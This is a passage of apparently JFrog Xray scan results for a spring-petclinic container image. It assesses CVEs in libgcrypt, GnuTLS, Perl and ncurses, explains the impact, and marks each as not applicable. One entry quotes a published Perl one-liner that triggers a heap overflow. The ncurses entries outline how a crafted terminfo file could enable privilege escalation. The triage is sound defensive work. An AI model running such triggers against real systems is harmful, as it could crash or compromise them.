            "ShortDescription": "Timing data leak in libgcrypt ElGamal encryption can lead to key brute force when attackers can cause many decryption operations.",
            "FullDescription": "[Libgcrypt](https://gnupg.org/software/libgcrypt/index.html) is a general-purpose cryptographic library based on the code from GnuPG.\n[ElGamal encryption](https://en.wikipedia.org/wiki/ElGamal_encryption) is a public-key cryptosystem that is widely used in OpenPGP for key management and encrypted communication.\n\nIn ElGamal encryption, the encryption operation involves raising a message to the power of the public key. An attacker might be able to perform a timing attack to extract information about the private key by observing the time it takes to perform the encryption.\n\nTo perform this attack, an attacker would need to be on the same machine or subnet where the decryption takes place, and be able to trigger many decryption operations (oracle attack).",
            "Impact": 5,
            "VulnerabilityType": "Data leakage",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker would need to be able to trigger many decryption operations (oracle attack).",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "ElGamal is rarely used alone (used more as part of a hybrid encryption type)",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can only be exploited by an attacker that can execute code on the vulnerable machine (excluding exceedingly rare circumstances)",
                  "Description": "Due to the nature of timing attacks, the attack would be much more successful by an attacker that can already run code on the machine that performs the decryption. At most, the attacker needs to be on the same subnet as the decryption machine.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has a detailed technical explanation published, that can aid in exploit development",
                  "Description": "The paper gives all the details to exploit this issue.",
                  "IsPositive": 0,
                  "InsertOrder": 4
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Technical Writeup",
                  "Title": "Paper explaining the issue.",
                  "Url": "https://eprint.iacr.org/2021/923.pdf",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch.",
                  "Url": "https://dev.gnupg.org/rCe8b7f10be275bcedb5fc05ed4837a89bfd605c61",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libgcrypt20:1.8.7-6",
            "cve_id": "CVE-2021-33560",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libgcrypt20:1.8.7-6",
            "vulnerability_id": "CVE-2021-33560",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-588550",
         "severity": "High",
         "jfrog_severity": "Low",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "A vulnerability was found in GnuTLS, where a cockpit (which uses gnuTLS) rejects a certificate chain with distributed trust. This issue occurs when validating a certificate chain with cockpit-certificate-ensure. This flaw allows an unauthenticated, remote client or attacker to initiate a denial of service attack.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libgnutls30",
         "source_id": "deb://debian:bullseye:libgnutls30",
         "source_comp_id": "deb://debian:bullseye:libgnutls30:3.7.1-5",
         "component_versions": {
            "id": "debian:bullseye:gnutls28",
            "vulnerable_versions": [
               "< 3.7.1-5+deb11u5"
            ],
            "fixed_versions": [
               "3.7.1-5+deb11u5"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-0567",
                     "cwe": [
                        "CWE-347"
                     ],
                     "cwe_details": {
                        "CWE-347": {
                           "name": "Improper Verification of Cryptographic Signature",
                           "description": "The product does not verify, or incorrectly verifies, the cryptographic signature for data."
                        }
                     },
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "A vulnerability was found in GnuTLS, where a cockpit (which uses gnuTLS) rejects a certificate chain with distributed trust. This issue occurs when validating a certificate chain with cockpit-certificate-ensure. This flaw allows an unauthenticated, remote client or attacker to initiate a denial of service attack.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-588550",
            "VulnerabilityTitle": "",
            "ShortDescription": "A design problem in GnuTLS may lead to denial of service when parsing a crafted certificate chain.",
            "FullDescription": "",
            "Impact": 4,
            "VulnerabilityType": "Denial of service",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The vulnerability is only exploitable if a GnuTLS client or server calls any of the following functions with externally-supplied input -\n\n- `gnutls_pcert_import_x509_list`\n\n- `gnutls_certificate_set_x509_key`\n\n- `gnutls_certificate_set_x509_simple_pkcs12_mem`\n\n- `gnutls_certificate_set_x509_simple_pkcs12_file`\n\n- `gnutls_privkey_import_url`\n\n- `gnutls_privkey_import_pkcs11_url`\n\n- `gnutls_read_key_file`\n\n- `gnutls_certificate_set_rawpk_key_file`\n\n- `gnutls_certificate_set_x509_key_file2`\n\n- `gnutls_certificate_set_x509_key_file`\n\n- `gnutls_pcert_list_import_x509_file`\n\n- `gnutls_certificate_set_x509_key_mem2`\n\n- `gnutls_certificate_set_x509_key_mem`\n\n- `gnutls_x509_crt_list_import`\n\n- `gnutls_pcert_list_import_x509_raw`\n\n- `gnutls_session_channel_binding`\n\n- `gnutls_x509_crt_list_import2`\n\n- `gnutls_x509_trust_list_add_trust_mem`\n\n- `gnutls_x509_trust_list_add_system_trust`\n\n- `gnutls_certificate_set_x509_system_trust`\n\n- `gnutls_certificate_set_x509_crl_mem`\n\n- `gnutls_certificate_set_x509_trust_mem`\n\n- `gnutls_x509_trust_list_add_trust_file`\n\n- `gnutls_certificate_set_x509_crl_file`\n\n- `gnutls_certificate_set_x509_trust_file`\n\n- `gnutls_x509_trust_list_add_trust_dir`\n\n- `gnutls_certificate_set_x509_trust_dir`\n\n- `gnutls_x509_trust_list_remove_trust_mem`\n\n- `gnutls_x509_trust_list_remove_trust_file`\n\n- `gnutls_x509_trust_list_verify_crt2`\n\n- `gnutls_x509_cert_verify_peers`\n\n- `gnutls_certificate_verify_peers`\n\n- `gnutls_certificate_verify_peers2`\n\n- `gnutls_certificate_verify_peers3`\n\n- `gnutls_pkcs7_verify`\n\n- `gnutls_ocsp_resp_verify`\n\n- `gnutls_x509_trust_list_verify_crt`",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
                  "Description": "The given CVSS score does not take into account the prerequisites and context required to exploit the vulnerability.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "No high-impact exploit or technical writeup were published, and exploitation of the issue with high impact is either non-trivial or completely unproven",
                  "Description": "",
                  "IsPositive": 1,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "RedHat Advisory",
                  "Url": "https://access.redhat.com/security/cve/CVE-2024-0567",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Fix commit",
                  "Url": "https://gitlab.com/gnutls/gnutls/-/commit/9edbdaa84e38b1bfb53a7d72c1de44f8de373405",
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Discussion in the GnuTLS repository (including a patch)",
                  "Url": "https://gitlab.com/gnutls/gnutls/-/issues/1521",
                  "InsertOrder": 3
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libgnutls30:3.7.1-5",
            "cve_id": "CVE-2024-0567",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libgnutls30:3.7.1-5",
            "vulnerability_id": "CVE-2024-0567",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-539839",
         "severity": "High",
         "jfrog_severity": "Low",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "A vulnerability was found in perl 5.30.0 through 5.38.0. This issue occurs when a crafted regular expression is compiled by perl, which can allow an attacker controlled byte buffer overflow in a heap allocated buffer.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:perl-base",
         "source_id": "deb://debian:bullseye:perl-base",
         "source_comp_id": "deb://debian:bullseye:perl-base:5.32.1-4+deb11u2",
         "component_versions": {
            "id": "debian:bullseye:perl",
            "vulnerable_versions": [
               "< 5.32.1-4+deb11u3"
            ],
            "fixed_versions": [
               "5.32.1-4+deb11u3"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-47038",
                     "cwe": [
                        "CWE-787"
                     ],
                     "cwe_details": {
                        "CWE-787": {
                           "name": "Out-of-bounds Write",
                           "description": "The product writes data past the end, or before the beginning, of the intended buffer.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "1"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "7.8/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "A vulnerability was found in perl 5.30.0 through 5.38.0. This issue occurs when a crafted regular expression is compiled by perl, which can allow an attacker controlled byte buffer overflow in a heap allocated buffer.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-539839",
            "VulnerabilityTitle": "",
            "ShortDescription": "(non-issue) A heap buffer overflow in Perl leads to no impact when parsing a crafted regular expression.",
            "FullDescription": "",
            "Impact": 4,
            "VulnerabilityType": "Unspecified",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "A test case is given, and is included in the Debian advisory:\n`perl -e 'qr/\\p{utf8::_perl_surrogate}/'`",
                  "IsPositive": 0,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "If the attacker can execute arbitrary Perl code, exploiting the vulnerability would offer no additional security impact.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
                  "Description": "The CVSS impact does not reflect the prerequisites required to exploit the vulnerability.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The attacker must be able to run Perl code which the victim executes.",
                  "IsPositive": 1,
                  "InsertOrder": 4
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Debian advisory including test case",
                  "Url": "https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1056746",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://github.com/Perl/perl5/commit/12c313ce49b36160a7ca2e9b07ad5bd92ee4a010#diff-dc8c62daf844c4b19510dfce777053a52ac4821852ef9818e3de8912dd3c4edb",
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Advisory",
                  "Url": "https://www.nntp.perl.org/group/perl.perl5.changes/2023/11/msg62424.html",
                  "InsertOrder": 3
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:perl-base:5.32.1-4+deb11u2",
            "cve_id": "CVE-2023-47038",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "This CVE is never applicable as it requires code execution",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:perl-base:5.32.1-4+deb11u2",
            "vulnerability_id": "CVE-2023-47038",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-513861",
         "severity": "High",
         "jfrog_severity": "Low",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "ncurses before 6.4 20230408, when used by a setuid application, allows local users to trigger security-relevant memory corruption via malformed data in a terminfo database file that is found in $HOME/.terminfo or reached via the TERMINFO or TERM environment variable.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:ncurses-bin",
         "source_id": "deb://debian:bullseye:ncurses-bin",
         "source_comp_id": "deb://debian:bullseye:ncurses-bin:6.2+20201114-2",
         "component_versions": {
            "id": "debian:bullseye:ncurses",
            "vulnerable_versions": [
               "< 6.2+20201114-2+deb11u2"
            ],
            "fixed_versions": [
               "6.2+20201114-2+deb11u2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-29491",
                     "cwe": [
                        "CWE-787"
                     ],
                     "cwe_details": {
                        "CWE-787": {
                           "name": "Out-of-bounds Write",
                           "description": "The product writes data past the end, or before the beginning, of the intended buffer.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "1"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "7.8/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "ncurses before 6.4 20230408, when used by a setuid application, allows local users to trigger security-relevant memory corruption via malformed data in a terminfo database file that is found in $HOME/.terminfo or reached via the TERMINFO or TERM environment variable.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-513861",
            "VulnerabilityTitle": "",
            "ShortDescription": "A heap buffer overflow in ncurses may lead to local privilege escalation when a setuid application parses a crafted terminfo database.",
            "FullDescription": "ncurses is a programming library that allows developers to create text-based user interfaces in a terminal or console window. It provides functions for controlling the cursor, displaying text and graphics, and handling user input, and is widely used in Unix-like operating systems for building cross-platform command-line applications.\nThe `terminfo` file is a database that stores information about terminal types and their capabilities.  By default, ncurses will search `${HOME}/.terminfo` first, then `/etc/terminfo`, then `/lib/terminfo`, and\n finally `/usr/share/terminfo`.\n\nTerminfo allows to declare user definable attributes, custom numbers or strings thatextend its standard capabilities.\nUsers can customize their own terminfo definitions by creating or modifying files within their `.terminfo`. \nThe `.terminfo` directory is typically located at `$HOME/.terminfo`, and users have the necessary privileges to modify the files within this directory. The default location can be overwritten by defining the `$TERMINFO` or `$TERM` environment variable.\nExample: `export TERMINFO=/my/terminfo/db/path`\n\nAn issue was discovered in the ncurses library's `_nc_read_termtype` function, responsible for parsing terminfo database file due to improper handling of heap allocation for `Strings` and `Extended Strings` within the `terminfo` file. The function fails to handle the allocation correctly, leading to a heap buffer overflow, which can result in memory corruption issues.\nDue to the nature of the vulnerability, an attacker would mainly try to get local privilege escalation. Then, the only binaries that are vulnerable to this issue are the `SetUID binaries` that are using `ncurses`. \n \nThe exposed functions that call the `_nc_read_termtype` function are: `_nc_read_file_entry`, `initscr`, `setupterm` and `resttarterm` functions.\n\nNote that this issue can also be triggered by the ncurses's progs tools like `infocmp` and `tic`. However, they're not `setuid` binaries so they cannot be used for a privilege escalation.",
            "Impact": 4,
            "VulnerabilityType": "Local privilege escalation",
            "Resolution": "##### Deployment mitigations\n\nMake the `TERMINFO` environment variable and the default user-controlled terminfo database file un-writeable:\n\n1. Identify the shell configuration file for the different user account in the system. The shell configuration file depends on the user's shell. Common examples include `.bashrc` for `Bash`, `.bash_profile` for `Bash login shells`, and `.profile` for `POSIX-compliant shells`. The file is typically located in the user's home directory.\n2. Open the file with `root` access\n3. Add the following line to make the TERMINFO environment variable un-writtable: \n```\nexport TERMINFO=\nreadonly TERMINFO\n```\n4. Still with `root` access, create an empty `.terminfo` file in the home directory of the user:\n```\ntouch $HOME/.terminfo\n```",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
                  "Description": "The CVSS score does not reflect the real-world impact of the issue, since the issue cannot be exploited by an external attacker.",
                  "IsPositive": 1,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "A crashing exploit including a technical write-up was published.",
                  "IsPositive": 0,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can only be exploited by an attacker that can execute code on the vulnerable machine (excluding exceedingly rare circumstances)",
                  "Description": "This issue can only be exploited for privilege escalation by running a setuid application using ncurses locally on the victim system.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The issue requires the following:\n1. The attackers must have access to the system on a low-permission user.\n2. Be able to download or create a malicious terminfo database file.\n3. Set the `$TERMINFO` environment variable.\n4. Lastly, a `setuid` binary that uses the ncurses library should be accessible to them.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "GitHub Advisory",
                  "Url": "https://github.com/advisories/GHSA-vh2x-5rx6-qqhv",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "Technical write-up and PoC",
                  "Url": "https://drive.google.com/drive/u/0/folders/1XZiHbH7W7is8cwTu7DKrpwBTYuYfRZqE",
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "http://ncurses.scripts.mit.edu/?p=ncurses.git;a=commit;h=eb51b1ea1f75a0ec17c9c5937cb28df1e8eeec56",
                  "InsertOrder": 3
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:ncurses-bin:6.2+20201114-2",
            "cve_id": "CVE-2023-29491",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:ncurses-bin:6.2+20201114-2",
            "vulnerability_id": "CVE-2023-29491",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-513861",
         "severity": "High",
         "jfrog_severity": "Low",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "ncurses before 6.4 20230408, when used by a setuid application, allows local users to trigger security-relevant memory corruption via malformed data in a terminfo database file that is found in $HOME/.terminfo or reached via the TERMINFO or TERM environment variable.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:ncurses-base",
         "source_id": "deb://debian:bullseye:ncurses-base",
         "source_comp_id": "deb://debian:bullseye:ncurses-bin:6.2+20201114-2",
         "component_versions": {
            "id": "debian:bullseye:ncurses",
            "vulnerable_versions": [
               "< 6.2+20201114-2+deb11u2"
            ],
            "fixed_versions": [
               "6.2+20201114-2+deb11u2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-29491",
                     "cwe": [
                        "CWE-787"
                     ],
                     "cwe_details": {
                        "CWE-787": {
                           "name": "Out-of-bounds Write",
                           "description": "The product writes data past the end, or before the beginning, of the intended buffer.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "1"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "7.8/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "ncurses before 6.4 20230408, when used by a setuid application, allows local users to trigger security-relevant memory corruption via malformed data in a terminfo database file that is found in $HOME/.terminfo or reached via the TERMINFO or TERM environment variable.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-513861",
            "VulnerabilityTitle": "",
            "ShortDescription": "A heap buffer overflow in ncurses may lead to local privilege escalation when a setuid application parses a crafted terminfo database.",
            "FullDescription": "ncurses is a programming library that allows developers to create text-based user interfaces in a terminal or console window. It provides functions for controlling the cursor, displaying text and graphics, and handling user input, and is widely used in Unix-like operating systems for building cross-platform command-line applications.\nThe `terminfo` file is a database that stores information about terminal types and their capabilities.  By default, ncurses will search `${HOME}/.terminfo` first, then `/etc/terminfo`, then `/lib/terminfo`, and\n finally `/usr/share/terminfo`.\n\nTerminfo allows to declare user definable attributes, custom numbers or strings thatextend its standard capabilities.\nUsers can customize their own terminfo definitions by creating or modifying files within their `.terminfo`. \nThe `.terminfo` directory is typically located at `$HOME/.terminfo`, and users have the necessary privileges to modify the files within this directory. The default location can be overwritten by defining the `$TERMINFO` or `$TERM` environment variable.\nExample: `export TERMINFO=/my/terminfo/db/path`\n\nAn issue was discovered in the ncurses library's `_nc_read_termtype` function, responsible for parsing terminfo database file due to improper handling of heap allocation for `Strings` and `Extended Strings` within the `terminfo` file. The function fails to handle the allocation correctly, leading to a heap buffer overflow, which can result in memory corruption issues.\nDue to the nature of the vulnerability, an attacker would mainly try to get local privilege escalation. Then, the only binaries that are vulnerable to this issue are the `SetUID binaries` that are using `ncurses`. \n \nThe exposed functions that call the `_nc_read_termtype` function are: `_nc_read_file_entry`, `initscr`, `setupterm` and `resttarterm` functions.\n\nNote that this issue can also be triggered by the ncurses's progs tools like `infocmp` and `tic`. However, they're not `setuid` binaries so they cannot be used for a privilege escalation.",
            "Impact": 4,
            "VulnerabilityType": "Local privilege escalation",
            "Resolution": "##### Deployment mitigations\n\nMake the `TERMINFO` environment variable and the default user-controlled terminfo database file un-writeable:\n\n1. Identify the shell configuration file for the different user account in the system. The shell configuration file depends on the user's shell. Common examples include `.bashrc` for `Bash`, `.bash_profile` for `Bash login shells`, and `.profile` for `POSIX-compliant shells`. The file is typically located in the user's home directory.\n2. Open the file with `root` access\n3. Add the following line to make the TERMINFO environment variable un-writtable: \n```\nexport TERMINFO=\nreadonly TERMINFO\n```\n4. Still with `root` access, create an empty `.terminfo` file in the home directory of the user:\n```\ntouch $HOME/.terminfo\n```",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
                  "Description": "The CVSS score does not reflect the real-world impact of the issue, since the issue cannot be exploited by an external attacker.",
                  "IsPositive": 1,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "A crashing exploit including a technical write-up was published.",
                  "IsPositive": 0,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can only be exploited by an attacker that can execute code on the vulnerable machine (excluding exceedingly rare circumstances)",
                  "Description": "This issue can only be exploited for privilege escalation by running a setuid application using ncurses locally on the victim system.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The issue requires the following:\n1. The attackers must have access to the system on a low-permission user.\n2. Be able to download or create a malicious terminfo database file.\n3. Set the `$TERMINFO` environment variable.\n4. Lastly, a `setuid` binary that uses the ncurses library should be accessible to them.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "GitHub Advisory",
                  "Url": "https://github.com/advisories/GHSA-vh2x-5rx6-qqhv",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "Technical write-up and PoC",
                  "Url": "https://drive.google.com/drive/u/0/folders/1XZiHbH7W7is8cwTu7DKrpwBTYuYfRZqE",
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "http://ncurses.scripts.mit.edu/?p=ncurses.git;a=commit;h=eb51b1ea1f75a0ec17c9c5937cb28df1e8eeec56",
                  "InsertOrder": 3
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:ncurses-bin:6.2+20201114-2",
            "cve_id": "CVE-2023-29491",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:ncurses-bin:6.2+20201114-2",
            "vulnerability_id": "CVE-2023-29491",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-513861",
         "severity": "High",
         "jfrog_severity": "Low",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "ncurses before 6.4 20230408, when used by a setuid application, allows local users to trigger security-relevant memory corruption via malformed data in a terminfo database file that is found in $HOME/.terminfo or reached via the TERMINFO or TERM environment variable.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libtinfo6",
         "source_id": "deb://debian:bullseye:libtinfo6",
         "source_comp_id": "deb://debian:bullseye:ncurses-bin:6.2+20201114-2",
         "component_versions": {
            "id": "debian:bullseye:ncurses",
            "vulnerable_versions": [
               "< 6.2+20201114-2+deb11u2"
            ],
            "fixed_versions": [
               "6.2+20201114-2+deb11u2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-29491",
                     "cwe": [
                        "CWE-787"
                     ],
                     "cwe_details": {
                        "CWE-787": {
                           "name": "Out-of-bounds Write",
                           "description": "The product writes data past the end, or before the beginning, of the intended buffer.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "1"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "7.8/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "ncurses before 6.4 20230408, when used by a setuid application, allows local users to trigger security-relevant memory corruption via malformed data in a terminfo database file that is found in $HOME/.terminfo or reached via the TERMINFO or TERM environment variable.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-513861",
            "VulnerabilityTitle": "",
            "ShortDescription": "A heap buffer overflow in ncurses may lead to local privilege escalation when a setuid application parses a crafted terminfo database.",
